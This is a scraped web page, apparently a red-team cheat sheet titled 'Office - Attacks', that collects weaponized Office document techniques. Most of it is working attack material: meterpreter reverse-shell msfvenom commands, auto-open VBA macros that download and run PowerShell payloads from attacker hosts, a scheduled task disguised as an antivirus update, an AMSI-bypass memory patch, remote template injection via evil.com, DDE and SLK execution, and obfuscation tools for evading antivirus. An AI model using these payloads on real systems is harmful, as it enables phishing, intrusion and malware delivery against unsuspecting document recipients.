EXITFUNC=thread &gt; popcalc64.bin # Custom shellcode msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b &#39;\x00&#39; msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b &#39;\x00&#39; # MSF shellcode msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b &#39;\x00&#39; -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b &#39;\x00&#39; -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin # For VBA Macro Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop When using Macrome build mode, the –password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of VelvetSweatshop is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003. XLM Excel 4.0 - SharpShooter https://github.com/mdsecactivebreach/SharpShooter 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Options -rawscfile &lt;path&gt; Path to raw shellcode file for stageless payloads --scfile &lt;path&gt; Path to shellcode file as CSharp byte array python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test # Creation of a VBA Macro # creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet. SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl # Creation of an Excel 4.0 SLK Macro Enabled Document ~# /!\ The shellcode cannot contain null bytes msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b &#39;\x00&#39; SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b &#39;\x00&#39; SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee XLM Excel 4.0 - EXCELntDonut XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files. AMSI has no visibility into XLM macros (for now) Anti-virus struggles with XLM (for now) XLM macros can access the Win32 API (virtualalloc, createthread, …) Open an Excel Workbook. Right click on “Sheet 1” and click “Insert…”. Select “MS Excel 4.0 Macro”. Open your EXCELntDonut output file in a text editor and copy everything. Paste the EXCELntDonut output text in Column A of your XLM Macro sheet. At this point, everything is in column A. To fix that, we’ll use the “Text-to-Columns”/”Convert” tool under the “Data” tab. Highlight column A and open the “Text-to-Columns” tool. Select “Delimited” and then “Semicolon” on the next screen. Select “Finished”. Right-click on cell A1* and select “Run”. This will execute your payload to make sure it works. To enable auto-execution, we need to rename cell A1* to “Auto_Open”. You can do this by clicking into cell A1 and then clicking into the box that says “A1”* just above Column A. Change the text from “A1”* to “Auto_Open”. Save the file and verify that auto-execution works. :warning: If you’re using the obfuscate flag, after the Text-to-columns operation, your macros won’t start in A1. Instead, they’ll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let’s say that cell is HJ1. If that’s the case, then complete steps 6-7 substituting HJ1 for A1 git clone https://github.com/FortyNorthSecurity/EXCELntDonut -f path to file containing your C# source code (exe or dll) -c ClassName where method that you want to call lives (dll) -m Method containing your executable payload (dll) -r References needed to compile your C# code (ex: -r &#39;System.Management&#39;) -o output filename --sandbox Perform basic sandbox checks. --obfuscate Perform basic macro obfuscation. # Fork git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\Users\User\Desktop\covenSource.cs C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\Users\User\Desktop\covenSource.cs donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate] python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md XLM Excel 4.0 - EXEC Right Click to the current sheet Insert a Macro IntL MS Excel 4.0 Add the EXEC macro 1 2 =EXEC(&quot;poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg(&#39;http://10.10.10.10:80/update.ps1&#39;)&quot;) =halt() Rename cell to Auto_open Hide your macro worksheet by a right mouse click on the sheet name Macro1 and selecting Hide DOCM - Metasploit use exploit/multi/fileformat/office_word_macro set payload windows/meterpreter/reverse_http set LHOST 10.10.10.10 set LPORT 80 set DisablePayloadHandler True set PrependMigrate True set FILENAME Financial2021.docm exploit -j DOCM - Download and Execute Detected by Defender (AMSI) Sub Execute() Dim payload payload = &quot;powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring(&#39;http://10.10.10.10:4242/exploit&#39;);&quot; Call Shell(payload, vbHide) End Sub Sub Document_Open() Execute End Sub DOCM - Macro Creator https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator # Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion: C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body # Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion: C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o # Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion: C:\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url &#39;http://my.server.com/sources.xml&#39; -d biblio -c &#39;regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll&#39; -o -e DOCM - C# converted to Office VBA macro A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted. https://github.com/trustedsec/unicorn python unicorn.py payload.cs cs macro DOCM - VBA Wscript https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office Sub parent_change() Dim objOL Set objOL = CreateObject(&quot;Outlook.Application&quot;) Set shellObj = objOL.CreateObject(&quot;Wscript.Shell&quot;) shellObj.Run(&quot;notepad.exe&quot;) End Sub Sub AutoOpen() parent_change End Sub Sub Auto_Open() parent_change End Sub 1 2 CreateObject(&quot;WScript.Shell&quot;).Run &quot;calc.exe&quot; CreateObject(&quot;WScript.Shell&quot;).Exec &quot;notepad.exe&quot; DOCM - VBA Shell Execute Comment Set your command payload inside the Comment metadata of the document. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Sub beautifulcomment() Dim p As DocumentProperty For Each p In ActiveDocument.BuiltInDocumentProperties If p.Name = &quot;Comments&quot; Then Shell (p.Value) End If Next End Sub Sub AutoExec() beautifulcomment End Sub Sub AutoOpen() beautifulcomment End Sub DOCM - VBA Spawning via svchost.exe using Scheduled Task Sub AutoOpen() Set service = CreateObject(&quot;Schedule.Service&quot;) Call service.Connect Dim td: Set td = service.NewTask(0) td.RegistrationInfo.Author = &quot;Kaspersky Corporation&quot; td.settings.StartWhenAvailable = True td.settings.Hidden = False Dim triggers: Set triggers = td.triggers Dim trigger: Set trigger = triggers.Create(1) Dim startTime: ts = DateAdd(&quot;s&quot;, 30, Now) startTime = Year(ts) &amp; &quot;-&quot; &amp; Right(Month(ts), 2) &amp; &quot;-&quot; &amp; Right(Day(ts), 2) &amp; &quot;T&quot; &amp; Right(Hour(ts), 2) &amp; &quot;:&quot; &amp; Right(Minute(ts), 2) &amp; &quot;:&quot; &amp; Right(Second(ts), 2) trigger.StartBoundary = startTime trigger.ID = &quot;TimeTriggerId&quot; Dim Action: Set Action = td.Actions.Create(0) Action.Path = &quot;C:\Windows\System32\powershell.exe&quot; Action.Arguments = &quot;-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&quot; Call service.GetFolder(&quot;\&quot;).RegisterTaskDefinition(&quot;AVUpdateTask&quot;, td, 6, , , 3) End Sub Rem powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&quot; DOCM - WMI COM functions Basic WMI exec (detected by Defender) : r = GetObject(&quot;winmgmts:\\.\root\cimv2:Win32_Process&quot;).Create(&quot;calc.exe&quot;, null, null, intProcessID) Sub wmi_exec() strComputer = &quot;.&quot; Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;) Set objStartUp = objWMIService.Get(&quot;Win32_ProcessStartup&quot;) Set objProc = objWMIService.Get(&quot;Win32_Process&quot;) Set procStartConfig = objStartUp.SpawnInstance_ procStartConfig.ShowWindow = 1 objProc.Create &quot;powershell.exe&quot;, Null, procStartConfig, intProcessID End Sub https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3 https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2 Sub ASR_bypass_create_child_process_rule5() Const HIDDEN_WINDOW = 0 strComputer = &quot;.&quot; Set objWMIService = GetObject(&quot;win&quot; &amp; &quot;mgmts&quot; &amp; &quot;:\\&quot; &amp; strComputer &amp; &quot;\root&quot; &amp; &quot;\cimv2&quot;) Set objStartup = objWMIService.Get(&quot;Win32_&quot; &amp; &quot;Process&quot; &amp; &quot;Startup&quot;) Set objConfig = objStartup.SpawnInstance_ objConfig.ShowWindow = HIDDEN_WINDOW Set objProcess = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root&quot; &amp; &quot;\cimv2&quot; &amp; &quot;:Win32_&quot; &amp; &quot;Process&quot;) objProcess.Create &quot;cmd.exe /c powershell.exe IEX ( IWR -uri &#39;http://10.10.10.10/stage.ps1&#39;)&quot;, Null, objConfig, intProcessID End Sub Sub AutoExec() ASR_bypass_create_child_process_rule5 End Sub Sub AutoOpen() ASR_bypass_create_child_process_rule5 End Sub Const ShellWindows = &quot;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&quot; Set SW = GetObject(&quot;new:&quot; &amp; ShellWindows).Item() SW.Document.Application.ShellExecute &quot;cmd.exe&quot;, &quot;/c powershell.exe&quot;, &quot;C:\Windows\System32&quot;, Null, 0 DOCM/XLM - Macro Pack - Macro and DDE Only the community version is available online. git clone https://github.com/sevagas/macro_pack https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # Options -G, --generate=OUTPUT_FILE_PATH. Generates a file. -t, --template=TEMPLATE_NAME Use code template already included in MacroPack -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name) # Execute a command echo &quot;calc.exe&quot; | macro_pack.exe -t CMD -G cmd.xsl # Download and execute a file echo &lt;file_to_drop_url&gt; &quot;&lt;download_path&gt;&quot; | macro_pack.exe -t DROPPER -o -G dropper.xls # Meterpreter reverse TCP template using MacroMeter by Cn33liz echo &lt;ip&gt; &lt;port&gt; | macro_pack.exe -t METERPRETER -o -G meter.docm # Drop and execute embedded file macro_pack.exe -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs # Obfuscate the vba file generated by msfvenom and put result in a new vba file. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba # Obfuscate Empire stager vba file and generate a MS Word document: macro_pack.exe -f empire.vba -o -G myDoc.docm # Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe) echo &quot;https://myurl.url/payload.exe&quot; &quot;dropped.exe&quot; | macro_pack.exe -o -t DROPPER -G &quot;drop.xlsm&quot; # Execute calc.exe via Dynamic Data Exchange (DDE) attack echo calc.exe | macro_pack.exe --dde -G calc.xslx # Download and execute file via powershell using Dynamic Data Exchange (DDE) attack macro_pack.exe --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.xsl # PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --keep-alive -G out.docm # PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses. msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --trojan -G hotpics.pptm # PRO: Generate an HTA payload able to run a shellcode via Excel injection echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE --run-in-excel -o -G samples\nicepic.hta echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\my_shortcut.lnk # PRO: XLM Injection echo &quot;MPPro&quot; | macro_pack.exe -G _samples\hello.doc -t HELLO --xlm --run-in-excel # PRO: ShellCode Exec - Heap Injection, AlternativeInjection echo &quot;x32calc.bin&quot; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc echo &quot;x32calc.bin&quot; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc # PRO: More shellcodes echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive echo &quot;x86.bin&quot; &quot;x64.bin&quot; | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc echo &quot;http://192.168.5.10:8080/x32calc.bin&quot; &quot;http://192.168.5.10:8080/x64calc.bin&quot; | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls DOCM - CACTUSTORCH VBA Module CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript https://github.com/mdsecactivebreach/CACTUSTORCH https://github.com/tyranid/DotNetToJScript/ CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ Import .cna in Cobalt Strike Generate a new VBA payload from the CACTUSTORCH menu Download DotNetToJscript Compile it DotNetToJscript.exe - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript ExampleAssembly.dll - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text “test” Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch Use the generated code to replace the hardcoded binary in CactusTorch DOCM - MMG with Custom DL + Exec Custom Download in first Macro to “C:\Users\Public\beacon.exe” Create a custom binary execute using MMG Merge both Macro git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator python MMG.py configs/generic-cmd.json malicious.vba { &quot;description&quot;: &quot;Generic command exec payload\nEvasion technique set to none&quot;, &quot;template&quot;: &quot;templates/payloads/generic-cmd-template.vba&quot;, &quot;varcount&quot;: 152, &quot;encodingoffset&quot;: 5, &quot;chunksize&quot;: 180, &quot;encodedvars&quot;: {}, &quot;vars&quot;: [], &quot;evasion&quot;: [&quot;encoder&quot;], &quot;payload&quot;: &quot;cmd.exe /c C:\\Users\\Public\\beacon.exe&quot; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Private Declare PtrSafe Function URLDownloadToFile Lib &quot;urlmon&quot; Alias &quot;URLDownloadToFileA&quot; (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean On Error GoTo Failed DownloadFileA = False &#39;As directory must exist, this is a check If CreateObject(&quot;Scripting.FileSystemObject&quot;).FolderExists(CreateObject(&quot;Scripting.FileSystemObject&quot;).GetParentFolderName(DownloadPath)) = False Then Exit Function Dim returnValue As Long returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0) &#39;If return value is 0 and the file exist, then it is considered as downloaded correctly DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) &gt; 0) Exit Function Failed: End Function Sub AutoOpen() DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\Users\\Public\\beacon.exe&quot; End Sub Sub Auto_Open() DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\Users\\Public\\beacon.exe&quot; End Sub DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro Go to Developer tab on ribbon -&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control 1 2 3 Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle) Run = Shell(&quot;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(&#39;https://&lt;host&gt;/file.exe&#39;,&#39;file.exe&#39;);Start-Process &#39;file.exe&#39;&quot;, vbNormalFocus) End Sub VBA Obfuscation # https://www.youtube.com/watch?v=L0DlPOLx2k0 $ git clone https://github.com/bonnetn/vba-obfuscator $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin VBA Purging VBA Stomping: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. :warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format. OfficePurge https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe 1 2 3 4 OfficePurge.exe -d word -f .\malicious.doc -m NewMacros OfficePurge.exe -d excel -f .\payroll.xls -m Module1 OfficePurge.exe -d publisher -f .\donuts.pub -m ThisDocument OfficePurge.exe -d word -f .\malicious.doc -l EvilClippy Evil Clippy uses the OpenMCDF library to manipulate CFBF files. Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows. If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this. # OSX/Linux mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs # Windows csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc # make macro code unaccessible is to mark the project as locked and unviewable: -u # Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag. EvilClippy.exe -r macrofile.doc VBA - Offensive Security Template Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process RunPE - https://github.com/itm4n/VBA-RunPE Spoof Parent - https://github.com/py7hagoras/OfficeMacro64 AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3 VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba VBA - AMSI The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/ :warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy). The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr Private Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtr Private Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long Private Declare PtrSafe Sub CopyMemory Lib &quot;kernel32&quot; Alias &quot;RtlMoveMemory&quot; (Destination As Any, Source As Any, ByVal Length As LongPtr) Private Sub Document_Open() Dim AmsiDLL As LongPtr Dim AmsiScanBufferAddr As LongPtr Dim result As Long Dim MyByteArray(6) As Byte Dim ArrayPointer As LongPtr MyByteArray(0) = 184 &#39; 0xB8 MyByteArray(1) = 87 &#39; 0x57 MyByteArray(2) = 0 &#39; 0x00 MyByteArray(3) = 7 &#39; 0x07 MyByteArray(4) = 128 &#39; 0x80 MyByteArray(5) = 195 &#39; 0xC3 AmsiDLL = LoadLibrary(&quot;amsi.dll&quot;) AmsiScanBufferAddr = GetProcAddress(AmsiDLL, &quot;AmsiScanBuffer&quot;) result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0) ArrayPointer = VarPtr(MyByteArray(0)) CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6 End Sub DOCX - Template Injection :warning: Does not require “Enable Macro” Remote Template A malicious macro is saved in a Word template .dotm file Benign .docx file is created based on one of the default MS Word Document templates Document from step 2 is saved as .docx Document from step 3 is renamed to .zip Document from step 4 gets unzipped .\word_rels\settings.xml.rels contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb). 1 2 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; &lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt; 1 2 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;https://evil.com/malicious.dotm&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt; File gets zipped back up again and renamed to .docx Template Injections Tools https://github.com/JohnWoodman/remoteInjector https://github.com/ryhanson/phishery $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx [+] Opening Word document: good.docx [+] Setting Word document template to: https://secure.site.local/docs [+] Saving injected Word document to: bad.docx [*] Injected Word document has been saved! DOCX - DDE Insert &gt; QuickPart &gt; Field Right Click &gt; Toggle Field Code { DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot; } SLK - Excel ID;P O;E NN;NAuto_open;ER101C1;KOut Flank;F C;X1;Y101;K0;EEXEC(&quot;c:\shell.cmd&quot;) C;X1;Y102;K0;EHALT() E References VBA RunPE Part 1 - itm4n VBA RunPE Part 2 - itm4n Office VBA AMSI Parting the veil on malicious macros - Microsoft Bypassing AMSI fro VBA - Outflank Evil Clippy MS Office Maldoc Assistant - Outflank Old schoold evil execl 4.0 macros XLM - Outflank Excel 4 Macro Generator x86/x64 - bytecod3r VBad - Pepitoh Excel 4.0 Macro Function Reference PDF Excel 4.0 Macros so hot right now - SneekyMonkey Macros and more with sharpshooter v2.0 - mdsec Further evasion in the forgotten corners of ms xls - malware.pizza Excel 4.0 macro old but new - fsx30 XLS 4.0 macros and covenant - d-sec Inject macro from a remote dotm template - ired.team Phishinh with OLE - ired.team Phishing SLK - ired.teambypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships) PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018 AMSI in the heap - rmdavy WordAMSIBypass - rmdavy Dechaining macros and evading EDR - Noora Hyvärinen Executing macros from docx with remote - RedXORBlueJuly 18, 2018 One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021 Running macros via ActiveX controls - greyhathacker - September 29, 2016 Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental" />
<link rel="canonical" href="http://localhost:4000/Office-Attacks/" />
<meta property="og:url" content="http://localhost:4000/Office-Attacks/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-04-22T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Office - Attacks" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Office - Attacks","dateModified":"2021-04-22T00:00:00+07:00","datePublished":"2021-04-22T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Office-Attacks/"},"url":"http://localhost:4000/Office-Attacks/","description":"Summary XLSM - Hot Manchego XLS - Macrome XLM Excel 4.0 - SharpShooter XLM Excel 4.0 - EXCELntDonut XLM Excel 4.0 - EXEC DOCM - Metasploit DOCM - Download and Execute DOCM - Macro Creator DOCM - C# converted to Office VBA macro DOCM - VBA Wscript DOCM - VBA Shell Execute Comment DOCM - VBA Spawning via svchost.exe using Scheduled Task DCOM - WMI COM functions (VBA AMSI) DOCM - winmgmts DOCM - Macro Pack - Macro and DDE DOCM - CACTUSTORCH VBA Module DOCM - MMG with Custom DL + Exec VBA Obfuscation VBA Purging OfficePurge EvilClippy VBA AMSI VBA - Offensive Security Template DOCX - Template Injection DOCX - DDE References XLSM - Hot Manchego When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn’t catch a simple lolbas payload to get a beacon on a target machine. https://github.com/FortyNorthSecurity/hot-manchego Generate CS Macro and save it to Windows as vba.txt PS&gt; New-Item blank.xlsm PS&gt; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /reference:EPPlus.dll hot-manchego.cs PS&gt; .\\hot-manchego.exe .\\blank.xlsm .\\vba.txt XLM - Macrome XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros. https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip # NOTE: The payload cannot contains NULL bytes. # Default calc msfvenom -a x86 -b &#39;\\x00&#39; --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread &gt; popcalc.bin msfvenom -a x64 -b &#39;\\x00&#39; --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread &gt; popcalc64.bin # Custom shellcode msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b &#39;\\x00&#39; msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b &#39;\\x00&#39; # MSF shellcode msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b &#39;\\x00&#39; -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b &#39;\\x00&#39; -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin # For VBA Macro Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop When using Macrome build mode, the –password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of VelvetSweatshop is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003. XLM Excel 4.0 - SharpShooter https://github.com/mdsecactivebreach/SharpShooter 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Options -rawscfile &lt;path&gt; Path to raw shellcode file for stageless payloads 